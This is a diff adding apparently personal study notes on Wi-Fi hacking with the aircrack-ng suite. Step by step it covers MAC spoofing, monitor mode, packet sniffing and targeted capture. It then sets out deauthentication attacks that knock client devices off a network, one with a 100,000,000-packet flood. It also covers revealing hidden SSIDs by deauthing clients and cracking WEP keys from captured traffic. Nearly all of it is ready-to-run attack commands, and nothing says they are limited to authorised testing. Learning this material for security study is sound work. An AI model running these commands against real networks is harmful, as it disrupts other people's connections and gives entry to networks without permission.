@@ -1,0 +1,86 @@
+# get the mac address
+-------------------------------------------
+> ifconfig
+The "ether" field will provide the MAC address
+
+# changing the mac address of wi-fi adapter
+-------------------------------------------
+1. disable the interface
+> ifconfig wlan0 down
+2. change the option value
+> ifconfig wlan0 hw ether 00:11:22:33:44:55
+3. enable the interface
+> ifconfig wlan0 up
+4. check the new MAC address
+> ifconfig
+
+Note: The mac address will revert back to original on restart as we are only changing the mac address in memory.
+
+# check the wireless mode (monitor/managed)
+-------------------------------------------
+> iwconfig
+The "mode" value will be either Managed or Monitor.
+
+# Change the wireless mode 
+-------------------------------------------
+1.disable the interface
+> ifconfig wlan0 down
+2. kill all the running process (optional)
+> airmon-ng check kill
+3. change the option value
+> iwconfig wlan0 mode monitor
+4. enable the interface
+> ifconfig wlan0 up
+5. verify the value
+> iwconfig
+
+# Packet sniffing (airodump-ng)
+-------------------------------------------
+1. enable the monitor mode of the interface
+2. basic command
+> airodump-ng wlan0
+This will show all nearby wi-fi access points, channel name etc
+3. check wi-fi access point for specific bands
+> airodump-ng --band a wlan0 
+This will show all access points supporting the 802.11a band
+> airodump-ng --band abg wlan0 
+This will show all access points supporting the 802.11a, 802.11b and 802.11g band
+
+# taget sniffing to specific AP
+-------------------------------------------
+1. Run the basic command to identify the all APs nearby
+> airodump-ng wlan0
+2. Get target sniffing
+> airodump-ng --bssid <BSSID> --channel <ChanelValue> --write <filename> wlan0
+
+
+# De-authentication attack (disconnect any device from the network)
+-------------------------------------------
+1. Perform the target sniffing. This will also identify all connected station with the target AP
+2. Run airodump-ng
+> airodump-ng --bssid <BSSID> --channel <ChanelValue> wlan0
+3. Perform the deauth attack for client station 
+> aireplay-ng --deauth 100000000 -a <BSSID> -c <client station MAC> wlan0
+Now the client station is disconnected from the Wi-Fi AP
+
+# Identifying the hidden SSID
+-------------------------------------------
+> airodump-ng --bssid <BSSID> --channel <ChanelValue> wlan0
+This will show the SSID if the network is Active. If not active then we need to run the deauth attack in separate session for very short time to disconnect the existing device.
+> aireplay-ng --deauth 4 -a <BSSID> -c <client station MAC> wlan0
+Now the airodump-ng will show the SSID of the hidden network.
+
+# Cracking WEP (method 1 - busy network)
+-------------------------------------------
+1. Identify the WEP network using the airodump-ng
+> airodump-ng wlan0
+2. capture all packets for the target network - 
+> airodump-ng --bssid <BSSID> --channel <ChanelValue> --write <filename> wlan0
+Once you have enough data packets, stop the capture
+3. Get the WEP key by
+> aircrack-ng <filename.cap>
+
+
+
+
+
